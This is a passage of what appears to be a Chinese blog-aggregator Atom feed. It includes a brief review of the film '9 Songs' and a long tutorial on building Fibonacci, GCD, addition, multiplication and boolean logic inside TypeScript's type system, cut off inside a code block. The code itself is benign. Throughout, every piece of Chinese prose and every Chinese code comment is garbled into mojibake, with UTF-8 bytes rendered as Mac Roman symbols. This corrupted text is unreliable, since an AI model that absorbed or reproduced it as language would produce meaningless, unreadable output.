<p>ÂÆ∂ÈáåÈïøËæàËÆ≤Âπ∂Ê≤°Êúâ‰∫∫ÊÄùÊÉ≥ËßâÊÇüÈ´òÂà∞ÊÉ≥Ë¶ÅÂú®ÂÜúÊùëÂ•ãÊñó‰∏ÄÁôæÂπ¥ÔºåÊï¥‰∏™Ââß‰∏çËøáÂ∞±ÊòØ‰∏Ä‰∏™ÊñáÂåñÂÆ£‰º†ÁâáËÄåÂ∑≤ÔºåÂõ†Ê≠§‰πüÂ∞±Ê≤°ÊúâÈÇ£‰πàÂ§öÈúÄË¶ÅÊÄùËÄÉÁöÑ‰∏úË•ø‰∫Ü„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[ËãèÁëûËæÖÁöÑ‰∏™‰∫∫ÁΩëÁ´ô]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/394</id>
        <title><![CDATA[Âπ≥ÔºàËßÇ„Ää9 Songs„ÄãÊúâÊÑüÔºâ]]></title>
        <updated>2020-02-07T05:39:56+08:00</updated>
        <link href="https://www.suruifu.com/posts/394"/>
        <content type="text/html" src="https://www.suruifu.com/posts/394"><![CDATA[<p><img src="https://s.suruifu.com/www/2020/02/lisa_matt_3.png" alt="" /><br />
ËØ¥Ëµ∑ÊÄßÔºåËøô‰∏™ÂâßÂ§™Âπ≥Ê∑°„ÄÇ‚ÄúÂà´ÁúãËøô‰∏™ÔºåÊ≤°‰ªÄ‰πàÊÑèÊÄù‚Äù„ÄÇ‰ªéÊÄßÁöÑËßíÂ∫¶Âá∫ÂèëÔºåÂ§™Âπ≥Ê∑°‰∫Ü„ÄÇ<br />
<img src="https://s.suruifu.com/www/2020/02/lisa_matt_1.png" alt="" /><br />
ËØ¥Ëµ∑Áà±ÔºåËøô‰∏™ÂâßÂ§™Âπ≥Âá°„ÄÇÊï¥‰∏™ÂâßÁúã‰∏ãÊù•‰∏çÊòØÂú®Âà∂ÈÄ†ÊÑüÂä®ÔºåËÄåÊòØÂú®Ê≠åÈ¢ÇÂπ≥Âá°„ÄÇ<br />
<img src="https://s.suruifu.com/www/2020/02/lisa.png" alt="" /><br />
‰∏§‰∏™‰∫∫ÈÉΩ‰∏çÊÉ≥Ë¶Ålong goodbyeÔºåMatt Âç¥ËøùÁ∫¶‰∫ÜÔºå‰ªñÈÄâÊã©‰∫ÜÂõûÂøÜÔºåËøôÊòØ‰∏Ä‰∏™Â§öÈïøÊó∂Èó¥ÁöÑÁ¶ªÂà´ÂëÄ„ÄÇ<br />
<img src="https://s.suruifu.com/www/2020/02/matt.png" alt="" /><br />
Now she&#8217;s gone, love burns inside me.</p>]]></content>
        <author>
            <name><![CDATA[ËãèÁëûËæÖÁöÑ‰∏™‰∫∫ÁΩëÁ´ô]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.rexskz.info/typescript-type-system-and-functional-programming.html</id>
        <title><![CDATA[TypeScript Á±ªÂûãÁ≥ªÁªü‰∏éÂáΩÊï∞ÂºèÁºñÁ®ã]]></title>
        <updated>2020-02-04T12:37:00+08:00</updated>
        <link href="https://blog.rexskz.info/typescript-type-system-and-functional-programming.html"/>
        <content type="text/html" src="https://blog.rexskz.info/typescript-type-system-and-functional-programming.html"><![CDATA[<h1>ËÉåÊôØ</h1><p>Êé•Ëß¶ TypeScript Â∑≤ÁªèÊúâ‰∏ÄÊÆµÊó∂Èó¥‰∫ÜÔºåËøôÊúüÈó¥ÂÜôËøá‰∏Ä‰∫õÂ§çÊùÇÁöÑÁ±ªÂûãÔºà‰æãÂ¶Ç <a href="https://blog.rexskz.info/issues-in-typescript-vue-component-lib.html#toc-link-6">ËøôÁØáÊñáÁ´†</a>ÔºâÔºåÊàëÂºÄÂßãÊÑèËØÜÂà∞ÔºöTypeScript ÁöÑÁ±ªÂûãÁ≥ªÁªüÂÜôËµ∑Êù•Â∞±ÂÉèÂáΩÊï∞ÂºèÁºñÁ®ã‰∏ÄÊ†∑„ÄÇÂéªÂπ¥ÊüêÂ§©Ôºå‰∏Ä‰∏™Âêå‰∫ãÁªôÊàëÂèë‰∫Ü‰∏™ÈìæÊé•ÔºåÈáåÈù¢ËÆ≤ÁöÑÊòØ‚ÄúTypeScript Á±ªÂûãÁ≥ªÁªüÁöÑÂõæÁÅµÂÆåÂ§á‚ÄùÔºåÈáåÈù¢ÁöÑ‰∏Ä‰∫õÂÜÖÂÆπÊàëËøòÂú®Âä™ÂäõÁêÜËß£Âà∞ÂèØ‰ª•ÂàÜ‰∫´ÁöÑÁ®ãÂ∫¶Ôºå‰ΩÜ‰∏Ä‰∫õ‰ª£Á†ÅÂ∑Æ‰∏çÂ§öÂèØ‰ª•ËØ¥Êòé TypeScript Á±ªÂûãÁ≥ªÁªüË∑üÂáΩÊï∞ÂºèÁºñÁ®ãÁöÑÊÄùÊÉ≥ÈùûÂ∏∏Êé•Ëøë‰∫Ü„ÄÇ</p><h1>ÂâçÊúüÁü•ËØÜ</h1><ul><li>ÊéåÊè° TypeScript ÁöÑ <a href="https://www.typescriptlang.org/docs/handbook/basic-types.html">Âü∫Êú¨Á±ªÂûã</a>ÔºåÁõ∏‰ø°Â§ßÂÆ∂ÈÉΩ‰∫ÜËß£Ôºõ</li><li>ÊéåÊè° TypeScript ÁöÑ <a href="https://www.typescriptlang.org/docs/handbook/advanced-types.html">È´òÁ∫ßÁ±ªÂûã</a> Âíå <a href="https://www.typescriptlang.org/docs/handbook/generics.html">Ê≥õÂûã</a>Ôºõ</li><li>ÈùûÂ∏∏ÁÜüÊÇâ <code>extends</code> Âíå <code>infer</code> ÁöÑ‰ΩøÁî®Ôºõ</li><li>‚ÄúÂáΩÊï∞ÂºèÁºñÁ®ã‚ÄùÁöÑÊ¶ÇÂøµÔºåÁõ∏‰ø°Â§ßÂÆ∂ÈÉΩÊàñÂ§öÊàñÂ∞ë‰ªéÂÖ¨‰ºóÂè∑ÈáåÈù¢Âê¨Âà∞Ëøá„ÄÇ</li></ul><blockquote><p>Êñá‰∏≠Êé•‰∏ãÊù•ÊâÄÊúâË∑ü TypeScript Áõ∏ÂÖ≥ÁöÑÈÉ®ÂàÜÔºåÈô§ÈùûÁâπÊÆäËØ¥ÊòéÔºåÂê¶Âàô‚ÄúÂáΩÊï∞‚Äù„ÄÅ‚ÄúÂèÇÊï∞‚ÄùÂùá‰∏∫Êñ∞ÁöÑÊ¶ÇÂøµÔºåËÄåÈùû TypeScript ‰∏≠ÁöÑ‚ÄúÂáΩÊï∞Á±ªÂûã‚Äù„ÄÅ‚ÄúÂèÇÊï∞ÂàóË°®‚Äù„ÄÇ</p></blockquote><h1>ÂÖçË¥£Â£∞Êòé</h1><ol><li>Êú¨ÊñáÂè™ÊòØËÆ≤Ëø∞‰∏Ä‰∏™‚ÄúÁêÜËÆ∫‰∏ä‚ÄùÂèØË°åÁöÑ‰∏úË•øÔºåÂπ∂ÈùûÊé®ËçêÂ§ßÂÆ∂Êó•Â∏∏ËøôÊ†∑ÂÜô„ÄÇ‰∫ãÂÆû‰∏äÔºåÁ±ªÂûãÊ†áÊ≥®Â∫îÂΩìÂú®ÈÄÇÂΩìÁ≤æÁ°ÆÁöÑÊÉÖÂÜµ‰∏ãÂ∞ΩÂèØËÉΩÁÆÄÊ¥ÅÔºàÂèÇËÄÉ <code>@types/ramda</code> ‰∏≠ÂØπ‰∫é <code>pipe</code> Á≠âÂáΩÊï∞ÁöÑÁ±ªÂûãÊ†áÊ≥®ÔºâÔºåÂõ†‰∏∫ÈúÄË¶ÅÊèêÈ´òÊïàÁéáÔºõ</li><li>Êú¨ÊñáÁöÑ‰ª£Á†ÅÂÆûÁé∞ÂùáÂè™ÂÅúÁïôÂú®ÂÆûÈ™åÂÆ§Èò∂ÊÆµÔºå‰∏çËÄÉËôëÂèØËÉΩÁöÑÊÄßËÉΩÈóÆÈ¢ò„ÄÇ</li></ol><h1>‰ªéÂáΩÊï∞ÂºèÁºñÁ®ãËØ¥Ëµ∑</h1><p>ÂáΩÊï∞ÂºèÁºñÁ®ãÊúâ‰ª•‰∏ãÂá†‰∏™ÁâπÁÇπÔºö</p><ul><li>ÊèèËø∞Êò†Â∞ÑÔºöÂáΩÊï∞ÂºèÁºñÁ®ãÂπ∂ÈùûÊèèËø∞Ëß£ÂÜ≥ÈóÆÈ¢òÁöÑÊ≠•È™§ÔºåËÄåÊòØÊèèËø∞ËæìÂÖ•‰∏éËæìÂá∫ÁöÑÊüêÁßçÊò†Â∞ÑÂÖ≥Á≥ªÔºõ</li><li>‰∏çÂèØÂèòÈáèÔºöÂáΩÊï∞ÂºèÁºñÁ®ã‰∏≠Ê≤°ÊúâÊâÄË∞ìÁöÑ‚ÄúÂèòÈáèËµãÂÄº‚ÄùÔºåÂè™Êúâ‚ÄúÂèÇÊï∞ÁªëÂÆö‚ÄùÔºå‰∏ÄÊó¶Êüê‰∏™ÂèÇÊï∞ÁªëÂÆö‰∫Ü‰∏Ä‰∏™ÂÄºÔºåÂàô‰∏çËÉΩË¢´ÈáçÊñ∞ÁªëÂÆöÔºõ</li><li>Êó†ÂâØ‰ΩúÁî®ÔºöÂáΩÊï∞ÁöÑËæìÂá∫Âè™‰æùËµñ‰∫éËæìÂÖ•ÁöÑÂèÇÊï∞ÔºåÂÖ•ÂèÇÁõ∏ÂêåÂàôËøîÂõûÂÄº‰∏ÄÂÆöÁõ∏ÂêåÔºåÂáΩÊï∞ËøêË°åËøáÁ®ã‰∏≠‰πü‰∏ç‰ºöÂØπÂ§ñÁïå‰∫ßÁîü‰ªª‰ΩïÂΩ±Âìç„ÄÇ</li><li>ÊÉ∞ÊÄßÊ±ÇÂÄºÔºöÂè™ÊúâÁúüÊ≠£Áî®Âà∞ÁöÑÂÄºÊâçÈúÄË¶ÅË¢´ËÆ°ÁÆóÔºõ</li><li>ÂáΩÊï∞ÊòØ‰∏ÄÁ≠âÂÖ¨Ê∞ëÔºöÂáΩÊï∞ÂèØ‰ª•ÔºàÁîöËá≥ÁªèÂ∏∏Ôºâ‰Ωú‰∏∫Âè¶‰∏Ä‰∏™ÂáΩÊï∞ÁöÑÂèÇÊï∞ÂíåËøîÂõûÂÄºÔºåif Á≠âËØ≠Âè•‰πüÊòØÂáΩÊï∞Ôºõ</li></ul><p>‰æãÂ¶Ç‰∏ãÈù¢ÁöÑ‰ª£Á†ÅÔºö</p><pre><code class="lang-javascript">/**
 * ÁÆÄÂçïÁöÑÊñêÊ≥¢ÈÇ£Â•ëÊï∞Âàó
 */
function fibonacci(n) {
    return n &lt;= 1 ? 1 : fibonacci(n - 1) + fibonacci(n - 2);
}
/**
 * ÁÆÄÂçïÁöÑÊ¨ßÂá†ÈáåÂæóÁÆóÊ≥ï
 */
function gcd(x, y) {
    return y === 0 ? x : gcd(y, x % y);
}
/**
 * Ë∂ÖËøêÁÆóÂáΩÊï∞
 * https://en.wikipedia.org/wiki/Hyperoperation
 * n = 0: b+1ÔºàÂêéÁªßÔºâ
 * n = 1: a+bÔºàÂä†Ê≥ïÔºåÂç≥ b Ê¨° a ÁöÑÂêéÁªßÔºâ
 * n = 2: a*bÔºà‰πòÊ≥ïÔºåÂç≥ b ‰∏™ a Áõ∏Âä†Ôºâ
 * n = 3: a^bÔºà‰πòÊñπÔºåÂç≥ b ‰∏™ a Áõ∏‰πòÔºâ
 * n = 4: a^a^a^...^aÔºàË∂ÖÂπÇÔºåÂç≥ b ‰∏™ a ‰∏çÊñ≠‰πòÊñπÔºâ
 *        \_________/
 *          b ‰∏™ a
 * n = ‚Ä¶‚Ä¶‚Ä¶‚Ä¶
 */
function hyperoperation(n, a, b) {
    return n === 0
        ? b + 1
        : n === 1 &amp;&amp; b === 0
            ? a
            : n === 2 &amp;&amp; b === 0
                ? b
                : n &gt; 2 &amp;&amp; b === 0
                    ? 1
                    : hyperoperation(n - 1, a, hyperoperation(n, a, b - 1));
}</code></pre><p>Áî±‰∫éÂáΩÊï∞ÂºèÁºñÁ®ãÁªèÂ∏∏Âá∫Áé∞ÈÄíÂΩíÔºå‰∏ìÈó®ÁöÑËØ≠Ë®ÄÔºàHaskell Á≠âÔºâ‰ºöÂ∞ÜÂ∞æÈÄíÂΩíËΩ¨Êç¢‰∏∫Âæ™ÁéØÔºå‰ª•ÊèêÂçáËøêË°åÊïàÁéáÔºõÊ≠§Â§ñÁî±‰∫éÂáΩÊï∞ÂºèÁºñÁ®ãÊúâ‚ÄúÊó†ÂâØ‰ΩúÁî®‚ÄùÁöÑÁâπÊÄßÔºå‰πüÂèØ‰ª•‰ΩøÁî®ËÆ∞ÂøÜÂåñÁ≠âÊñπÂºèÈÅøÂÖçÈáçÂ§çËÆ°ÁÆó„ÄÇ</p><h1>TypeScript Ê≥õÂûãÁöÑ‰æãÂ≠ê</h1><p>Âú® TypeScript ‰∏≠ÔºåÊàë‰ª¨ÂÅ∂Â∞î‰ºöÁî®Âà∞Ê≥õÂûãÔºåÊØîÂ¶Ç‰∏ãÈù¢ÁöÑÂÜ∑È•≠Ôºà‰Ω†ÁåúÂØπ‰∫ÜÔºåËøô‰∫õÈÉΩÂá∫Ëá™Êú¨ÊñáÁöÑÁ¨¨‰∏Ä‰∏™ÈìæÊé•ÔºâÔºö</p><pre><code class="lang-typescript">type InstanceType&lt;T&gt; =
    T extends ConstructorType&lt;infer R&gt;
        ? R
        : T;
type RemovePropOptions&lt;T&gt; =
    NonNullable&lt;
        T extends PropOptions&lt;infer R&gt;
            ? R
            : null
    &gt;;
type OneOfTypePropOptions&lt;T&gt; =
    T extends ArrayType
        ? RemovePropOptions&lt;ValueOf&lt;T&gt;&gt;
        : T;
type ShapePropOptions&lt;T&gt; =
    T extends ShapeType
        ? { [K in keyof T]: RemovePropOptions&lt;T[K]&gt; }
        : T;</code></pre><p>‰πçÁúã‰∏äÂéªÔºåTypeScript ÁöÑÊ≥õÂûãÈïøÂæóÂæàÂÉèÂáΩÊï∞ÔºöÂÆö‰πâÊ≥õÂûãÁõ∏ÂΩì‰∫éÂÆö‰πâ‰∏Ä‰∏™ÂáΩÊï∞ÔºåÂÖ∂‰∏≠ÁöÑ <code>T</code>„ÄÅ<code>R</code> Á≠âÁ±ªÂûãÂèòÈáèÂèØ‰ª•Ë¢´Áúã‰ΩúÂèÇÊï∞„ÄÇ‰ΩÜÈÄöËøá‰∏çÊñ≠Â∞ùËØïÂ§ñÂä†Êü•ËµÑÊñôÔºåÊàë‰ª¨ÊúÄÁªàÈÉΩ‰ºöÊÑèËØÜÂà∞ÔºöÂú® TypeScript ÁöÑÊ≥õÂûãÂÆö‰πâ‰∏≠ÊòØÊó†Ê≥ïËá™Áî±ÁöÑÂÆö‰πâÂèòÈáèÂπ∂ËµãÂÄºÁöÑÔºåËøôÊÑèÂë≥ÁùÄÂÆÉË∑üÊàë‰ª¨Êó•Â∏∏ÂÜôÁöÑÂáΩÊï∞ËøòÊúâ‰∏Ä‰∫õÂå∫Âà´„ÄÇ</p><p>ÁÑ∂ÈπÖÂ§ßÂÆ∂ÊòØÂê¶ËßâÂæóËøôÁßçÂÜôÊ≥ïË∑üÂáΩÊï∞ÂºèÁºñÁ®ãÊúâÁÇπÁúºÁÜüÔºüÊúâÊ≤°ÊúâÂèØËÉΩÁî® TypeScript Á±ªÂûãÁ≥ªÁªüÊù•ÈáçÂÜô‰∏äÈù¢ÁöÑÂáΩÊï∞ÂºèÁºñÁ®ã‰ª£Á†ÅÂë¢Ôºü</p><p>‰∏çÁÆ°ÊúâÊ≤°ÊúâÊÑè‰πâÔºåÊàë‰ª¨ÂÖàËØïÁùÄÁî®Êòì‰∫éÁêÜËß£„ÄÅ‰ΩÜÊòØÈîôËØØÁöÑËØ≠Ê≥ïÂÜô‰∏Ä‰∏ãÔºà‰∏∫‰∫ÜÈÅøÂÖçÈ´ò‰∫ÆÂá∫Áé∞Ê∑∑‰π±ÔºåËøôÊÆµ‰ª£Á†ÅÂ∞±‰∏çÂä†È´ò‰∫Æ‰∫ÜÔºâÔºö</p><pre><code class="lang-text">type Fibonacci&lt;N&gt; =
    N &lt;= 1 ? 1 : Fibonacci&lt;N - 1&gt; + Fibonacci&lt;N - 2&gt;;
type Gcd&lt;X, Y&gt; =
    Y = 0 ? X : Gcd&lt;Y, X % Y&gt;;
type Hyperoperation&lt;N, A, B&gt; =
    N = 0
        ? B + 1
        : N = 1 &amp; B = 0
          ? A
          : N = 2 &amp; B = 0
            ? B
            : N &gt; 2 &amp; B = 0
                ? 1
                : Hyperoperation&lt;N - 1, A, Hyperoperation&lt;N, A, B - 1&gt;&gt;;</code></pre><h1>‰ªéÈõ∂ÂºÄÂßãÁöÑÈÄ†ËΩÆÂ≠êÁîüÊ¥ª</h1><p>Emmm‚Ä¶‚Ä¶ËôΩÁÑ∂ÁúãËµ∑Êù•Êå∫ÂÆπÊòìÁêÜËß£ÁöÑÔºå‰ΩÜËøôÊØïÁ´üÂÆåÂÖ®‰∏çÊòØ TypeScript‚Ä¶‚Ä¶‰∏∫‰∫ÜÁî®ÁúüÊ≠£ÁöÑ TypeScript Êù•ÁºñÂÜôËøôÊÆµ‰ª£Á†ÅÔºåÊàë‰ª¨Êù•ÁúãÁúãÁ©∂Á´üÈúÄË¶ÅÂì™‰∫õËΩÆÂ≠êÔºàÂ∑•ÂÖ∑Á±ªÂûãÔºâ„ÄÇ</p><h2>ÂÆö‰πâ‚ÄúÁ±ªÂûã‚Äù</h2><p>È¶ñÂÖàÔºå‰∏∫‰∫ÜËÉΩËÆ© TypeScript ÂÖÅËÆ∏Êàë‰ª¨ÂØπÊ≥õÂûãÂèÇÊï∞ÂÅö‰∏Ä‰∫õÊìç‰ΩúÔºà‰æãÂ¶ÇÂèñÈïøÂ∫¶ÔºâÔºåÊàë‰ª¨ÈúÄË¶ÅÂÖàÂÆö‰πâ‰∏Ä‰∫õÁ±ªÂûã„ÄÇÂú®ËøôÈáåÊàë‰ª¨ÊäõÂºÄ JavaScript ÁöÑ‰∏ÄÂàáÁü•ËØÜÔºåÂõ†‰∏∫Âú® TypeScript Á±ªÂûãÁ≥ªÁªüÁöÑ‰∏ñÁïå‰∏≠ÔºåÊàë‰ª¨ÁõÆÂâç‰∏ÄÊó†ÊâÄÊúâ‚Äî‚ÄîËøôÊÑèÂë≥ÁùÄÊàë‰ª¨Ë¶Å‰ªéÊúÄÂü∫Á°ÄÁöÑÂºÄÂßãÂÆö‰πâÔºö</p><pre><code class="lang-typescript">// Áî®Â≠óÁ¨¶‰∏≤Êù•‰ª£ÊõøÈÄªËæëÂÄº
type Bool = 'true' | 'false';
// Áî®Êï∞ÁªÑÁöÑÈïøÂ∫¶‰Ωú‰∏∫Êï∞Â≠óÁöÑÂ§ßÂ∞è
type Int = any[];
// Á¨¨‰∏Ä‰∏™Êï∞Â≠ó
type _0 = [];</code></pre><h2>ÁÆÄÂçïÁöÑ‰ª£Êï∞Á≥ªÁªü</h2><p>Èô§‰∫Ü‚ÄúÁ±ªÂûã‚Äù‰ª•Â§ñÔºåÊò†ÂÖ•ÁúºÂ∏òÁöÑÂ∞±ÊòØ <code>&lt;=</code>„ÄÅ<code>+</code>„ÄÅ<code>-</code> Á≠âÁ¨¶Âè∑„ÄÇÊàë‰ª¨ÈúÄË¶ÅÂÖàÂÆûÁé∞‰∏Ä‰∏™ÁÆÄÂçïÁöÑ‰ª£Êï∞Á≥ªÁªü„ÄÇ‰∏∫‰∫ÜÁÆÄÂçïËµ∑ËßÅÔºåÊàë‰ª¨ÂÅáËÆæÊâÄÊúâÁöÑÊï∞Â≠óÈÉΩÊòØÈùûË¥üÊï¥Êï∞„ÄÇ</p><p>È¶ñÂÖà‰ªé‚ÄúÂêéÁªß‚ÄùËøêÁÆóÂºÄÂßãÔºåÊúüÊúõÁöÑÊïàÊûúÂ¶Ç‰∏ãÔºö</p><pre><code class="lang-typescript">type Next&lt;I extends Int&gt; = Prepend&lt;any, I&gt;;

type _1 = Next&lt;_0&gt;; // [any]
type _2 = Next&lt;_1&gt;; // [any, any]
type _3 = Next&lt;_2&gt;; // [any, any, any]</code></pre><p>ËøôÈáåÁöÑ <code>Prepend</code> ËØ•Â¶Ç‰ΩïÂÆûÁé∞Âë¢ÔºüÊúâ‰∏Ä‰∏™Âæà Tricky ÁöÑÊñπÊ≥ïÔºåÊàë‰ª¨ÊûÑÈÄ†‰∏Ä‰∏™ÂáΩÊï∞ÔºåÂÆÉÁöÑÂèÇÊï∞Á±ªÂûãÊòØ <code>any</code> + <code>any[]</code>ÔºåÁÑ∂ÂêéÈÄöËøá <code>extends</code> Âíå <code>infer</code> Â∞ÜÁúüÊ≠£ÁöÑÂèÇÊï∞Á±ªÂûãÊèêÂèñÂá∫Êù•Ôºö</p><pre><code class="lang-typescript">type Prepend&lt;E, T extends Int&gt; =
    ((e: E, ...list: T) =&gt; any) extends ((...list: infer R) =&gt; any)
      ? R : T;</code></pre><p>ÂêåÁêÜÔºåÊàë‰ª¨ÈúÄË¶Å‰∏Ä‰∏™ <code>Prev</code> ÂáΩÊï∞ÔºåÂÆÉÊòØ <code>Next</code> ÂáΩÊï∞ÁöÑÈÄÜËøêÁÆóÔºåÊàë‰ª¨ÂèØ‰ª•Áî®ÂáΩÊï∞ÂºèÁºñÁ®ã‰∏≠Â∏∏Áî®ÁöÑ <code>Tail</code> Êù•ÂÆûÁé∞Ôºö</p><pre><code class="lang-typescript">type Tail&lt;T extends Int&gt; =
    ((...t: T) =&gt; any) extends ((_: any, ...tail: infer R) =&gt; any)
    ? R : [];

type Prev&lt;I extends Int&gt; = Tail&lt;I&gt;;
type __2 = Prev&lt;_3&gt;; // [any, any]</code></pre><p>Âä†Ê≥ïÂ∞±ÊòØ‰∏çÊñ≠Âú∞Ë∞ÉÁî® <code>Next</code>Ôºö</p><pre><code class="lang-typescript">type Add&lt;A extends Int, B extends Int&gt; =
    B extends _0 ? A : Add&lt;Next&lt;A&gt;, Prev&lt;B&gt;&gt;;
//                     ^^^^^^^^^^^^^^^^^^^^^</code></pre><p>ÁÑ∂ËÄåÂ¶ÇÊûúËøôÊ†∑ÂÜôÔºåTypeScript Âú®Êé®ÂØºÊó∂‰ºöÊó†Ê≥ïÁ°ÆÂÆö <code>Add</code> Á©∂Á´üÊòØ‰∏™‰ªÄ‰πàÁ±ªÂûãÔºàÊä•Èîô <code>ts(2456)</code>ÔºåÂõ†‰∏∫ÂÆÉÂú®ÊØè‰∏ÄÂ±ÇÈÉΩÊó†Ê≥ïÂæóÂà∞‰∏Ä‰∏™Á°ÆÂÆöÁöÑÁªìÊûúÔºâÔºåÊâÄ‰ª•ÈúÄË¶Å‰∏ÄÁÇπÂèòÈÄö„ÄÇ‰∏ãÈù¢‰∏ÄÁßçÂÜôÊ≥ïÂèØ‰ª•ËÆ© TypeScript Âú®ÈÄíÂΩíÁöÑÊØè‰∏ÄÂ±ÇÈÉΩÊúâ‰∏Ä‰∏™Á°ÆÂÆöÁöÑÁªìÊûúÔºö</p><pre><code class="lang-typescript">type Add&lt;A extends Int, B extends Int&gt; = {
    'true': A
    'false': Add&lt;Next&lt;A&gt;, Prev&lt;B&gt;&gt;
}[B extends _0 ? 'true' : 'false'];

type _4 = Add&lt;_1, _3&gt;; // [any, any, any, any]
type _5 = Add&lt;_2, _3&gt;; // [any, any, any, any, any]</code></pre><blockquote><p>Ê≥®ÊÑèÔºöTypeScript Âú®ÈÄíÂΩíË∂ÖËøá 50 Â±Ç‰πãÂêéÔºå‰ºöÂº∫Ë°åÊé®ÂØº‰∏∫ <code>any</code>ÔºåÊâÄ‰ª•ÂÆûÈôÖ‰∏äÊù•ËÆ≤ÔºåÊàë‰ª¨ÁõÆÂâçÁöÑ‰ª£Á†ÅÊó†Ê≥ïÂ§ÑÁêÜ 50 ‰ª•‰∏äÁöÑÂä†Ê≥ï„ÄÇ</p></blockquote><p>ÂΩìÁÑ∂ÔºåÂÖ∂‰∏≠ÁöÑ <code>B extends _0 ? 'true' : 'false'</code> ÂèØ‰ª•ÊäΩÊàê‰∏Ä‰∏™Â∑•ÂÖ∑ÂáΩÊï∞Ôºö</p><pre><code class="lang-typescript">type Eq&lt;A extends Int, B extends Int&gt; = A extends B ? 'true' : 'false';

type Add&lt;A extends Int, B extends Int&gt; = {
    'true': A
    'false': Add&lt;Next&lt;A&gt;, Prev&lt;B&gt;&gt;
}[Eq&lt;B, _0&gt;];</code></pre><p>ÂáèÊ≥ï‰πüÂèØ‰ª•ÈÄöËøáÁ±ª‰ººÁöÑÊñπÂºèÂÜôÂá∫Êù•Ôºö</p><pre><code class="lang-typescript">type Sub&lt;A extends Int, B extends Int&gt; = {
    'true': A
    'false': Sub&lt;Prev&lt;A&gt;, Prev&lt;B&gt;&gt;
}[Eq&lt;B, _0&gt;];

type __3 = Sub&lt;_5, _2&gt;; // [any, any, any]</code></pre><p>‰πòÊ≥ïÊàë‰ª¨ÈúÄË¶ÅÂÜô‰∏Ä‰∏™ËæÖÂä©ÂáΩÊï∞ÔºåÂõ†‰∏∫Êàë‰ª¨Ë¶Å‰øùÂ≠ò‰∏Ä‰∏™Á¥ØÂä†Âô®Ôºö</p><pre><code class="lang-typescript">type _Mul&lt;Counter extends Int, A extends Int, B extends Int&gt; = {
    'true': Counter
    'false': _Mul&lt;Add&lt;Counter, A&gt;, A, Prev&lt;B&gt;&gt;
//           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
}[Eq&lt;B, _0&gt;];

type Mul&lt;A extends Int, B extends Int&gt; = _Mul&lt;_0, A, B&gt;;</code></pre><p>Áúã‰ººÂæàÁÆÄÂçïÁöÑ‰∏úË•øÔºå‰ΩÜÊòØ TypeScript ‰ºöÊä• <code>ts(2589)</code>ÔºåÂõ†‰∏∫ÂÆÉËÆ§‰∏∫ËøôÊ†∑ÂèØËÉΩ‰ºöÈÄíÂΩíÈùûÂ∏∏Ê∑±ÔºåÊâÄ‰ª•Áõ¥Êé•ÊãíÁªùÊé®ÂØº„ÄÇËøôÈáåÂèØ‰ª•Áî® <code>infer</code> Â∞ÜÊú™Êù•ÈúÄË¶ÅÁöÑËøêÁÆóÊèêÂâç‰∏Ä‰∫õÔºö</p><pre><code class="lang-typescript">type _Mul&lt;Counter extends Int, A extends Int, B extends Int&gt; = {
    'true': Counter
    'false': Add&lt;Counter, A&gt; extends infer R ? _Mul&lt;R, A, Prev&lt;B&gt;&gt; : never
//                                                  ^
}[Eq&lt;B, _0&gt;];</code></pre><p>Êä•ÈîôÂèòÊàê‰∫Ü <code>ts(2344)</code>ÔºåËØ¥ <code>R</code> ‰∏çÊòØ‰∏Ä‰∏™ <code>Int</code>„ÄÇÂõ†‰∏∫ TypeScript ÁöÑ <code>infer</code> ÊòØÊó†Ê≥ïÈ¢ÑÂÖàÁü•ÈÅìÁªìÊûúÁöÑÔºå‰ΩÜÊàë‰ª¨Áü•ÈÅìÂÆÉ‰∏ÄÂÆöÊòØ‰∏™ <code>Int</code>ÔºåÂõ†Ê≠§ÂÜçÂÜô‰∏Ä‰∏™ËΩ¨Êç¢ÂáΩÊï∞ <code>Cast</code>ÔºåÁõ∏ÂΩì‰∫éÂº∫Âà∂Á±ªÂûãËΩ¨Êç¢Ôºà‰∫ãÂÆû‰∏äÊ†πÊú¨Ê≤°ËΩ¨ÔºâÔºö</p><pre><code class="lang-typescript">type Cast&lt;X, Y&gt; = X extends Y ? X : Y;

type _Mul&lt;Counter extends Int, A extends Int, B extends Int&gt; = {
    'true': Counter
    'false': Add&lt;Counter, A&gt; extends infer R ? _Mul&lt;Cast&lt;R, Int&gt;, A, Prev&lt;B&gt;&gt; : never
}[Eq&lt;B, _0&gt;];

type _6 = Mul&lt;_2, _3&gt;; // [any, any, any, any, any, any]</code></pre><p>Êï¥Èô§ÂíåÂèñÊ®°ÈÄöËøáÁõÆÂâçÂ∑≤ÊúâÁöÑÂ∑•ÂÖ∑ÂáΩÊï∞Â∑≤ÁªèÂèØ‰ª•ÂÜôÂá∫Êù•‰∫ÜÔºåÂéüÁêÜÊòØÂæ™ÁéØÁõ∏ÂáèÔºåÊúâÂÖ¥Ë∂£ÁöÑÂêåÂ≠¶ÂèØ‰ª•Ëá™Ë°åÂÆûË∑µ‰∏Ä‰∏ãÔºåÂºÄÂ§¥Â∞±Áî® <code>Div&lt;A extends Int, B extends Int&gt;</code> Âíå <code>Mod&lt;A extends Int, B extends Int&gt;</code> Âêß„ÄÇ</p><p>ÁÑ∂ÂêéÊòØ‰∏Ä‰∫õÈíàÂØπÂ∏ÉÂ∞îÂÄºÁöÑÈÄªËæëËøêÁÆó <code>And</code>„ÄÅ<code>Or</code>„ÄÅ<code>Not</code>Ôºö</p><pre><code class="lang-typescript">type And&lt;A extends Bool, B extends Bool&gt; =
    A extends 'false' ? 'false' : B extends 'false' ? 'false' : 'true';

type _and_true_true = And&lt;'true', 'true'&gt;;     // 'true'
type _and_true_false = And&lt;'true', 'false'&gt;;   // 'false'
type _and_false_true = And&lt;'false', 'true'&gt;;   // 'false'
type _and_false_false = And&lt;'false', 'false'&gt;; // 'false'

type Or&lt;A extends Bool, B extends Bool&gt; =
    A extends 'true' ? 'true' : B extends 'true' ? 'true' : 'false';

type _or_true_true = Or&lt;'true', 'true'&gt;;     // 'true'
type _or_true_false = Or&lt;'true', 'false'&gt;;   // 'true'
type _or_false_true = Or&lt;'false', 'true'&gt;;   // 'true'
type _or_false_false = Or&lt;'false', 'false'&gt;; // 'false'

type Not&lt;A extends Bool&gt; = A extends 'true' ? 'false' : 'true';

type _not_true = Not&lt;'true'&gt;;   // 'false'
